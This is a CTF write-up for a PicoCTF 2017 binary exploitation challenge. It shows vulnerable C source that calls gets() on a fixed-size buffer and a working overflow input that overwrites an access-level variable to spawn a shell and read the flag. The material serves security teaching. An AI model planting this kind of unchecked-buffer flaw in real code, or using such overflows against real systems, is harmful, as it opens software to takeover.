# VR Gear Console
Level 2 Binary Exploitation Challend in PicoCTF2017 competition
```
Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/51645e84d55d376442beaf264e0908b9

HINTS
-What happens if you read in more characters than the length of the username buffer?
-You should look at an ascii table to see what character you need to choose.
-Numbers are stored in little-endian format, which means that the lowest byte of the number is first.
-"cat file - | vrgearconsole " will keep the pipe open for commands.
```

First let's look at the source code for the main function folder. 
```C

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    ...
    
    ...
    int access = login();

    printf("Your access level is: 0x%08x\n", access);

    if (access >= 0xff || access <= 0) {
        printf("Admin access granted!\n");
        printf("The flag is in \"flag.txt\".\n");
        system("/bin/sh");
    } else if (access < 0x30) {
        printf("Admin access granted!\n");
        printf("The flag is in \"flag.txt\".\n");
        system("/bin/sh");
    } else {
        printf("Login successful.\n");
        printf("You do not have permission to access this resource.\n");
        exit(1);
    }
}

```
It gets an integer from the result of login() and then tries to authenticate the user based on that integer. Let's see if there are any ways we can manipulate what the call to login() will return.

```C
int login() {
    int accessLevel = 0xff;
    char username[16];
    char password[32];
    printf("Username (max 15 characters): ");
    gets(username);
    printf("Password (max 31 characters): ");
    gets(password);

    if (!strcmp(username, "admin") && !strcmp(password, "{{ create_long_password() }}")) {
        accessLevel = 2;
    } else if (!strcmp(username, "root") && !strcmp(password, "{{ create_long_password() }}")) {
        accessLevel = 0;
    } else if (!strcmp(username, "artist") && !strcmp(password, "my-password-is-secret")) {
        accessLevel = 0x80;
    }

    return accessLevel;
}
```

The first thing we noticed is that login returns a variable accessLevel as opposed that is assigned in the if/else if statements as opposed to a constant. Noting the use of gets a vulnerable c function which does not prevent overflow of fields we knew to look for a buffer overflow vulnerability. The username field will overflow upward into the accessLevel variable. This can be checked by entering a string longer than 16 bytes into the username field and then observing any changes made to the accessLevel variable.

```
Username (max 15 characters): AAAABBBBCCCCDDDDEEEE
Password (max 31 characters):
Your access level is: 0x45454545
Login unsuccessful.
```

Providing the console with our input, we can see that the value of accessLevel has been changed to 0x45454545, 4 bytes worth of the ascii values for 'E'. It should be noted that if we overflow the buffer with enough characters we can cause a segfault by overwriting return pointers or other important data that the program needs to operate, but this is not our goal for this challenge. 

Now we simply want the value of accessLevel to be something that will get us admin access, anything less than 0x30. To accomplish this we must enter 16 characters followed by an ascii character with a value < 0x30. The 17th character occupies the least significant byte of accessLevel because the system is little endian; thus it will be used to enter our value in the required range. We used 'tab', but many other characters work like '/' for example. I will use '/' in this writeup because it shows up easier. Then we simply cat the flag.

```
Username (max 15 characters): 1234567890123456/                                          
Password (max 31 characters):                                                            
Your access level is: 0x0000002f                                                         
Admin access granted!                                                                    
The flag is in "flag.txt".                                                               
$ cat flag.txt                                                                           
8b7ea70220f19ab662750a8710a552c4                                                         
$                                                                                        
```






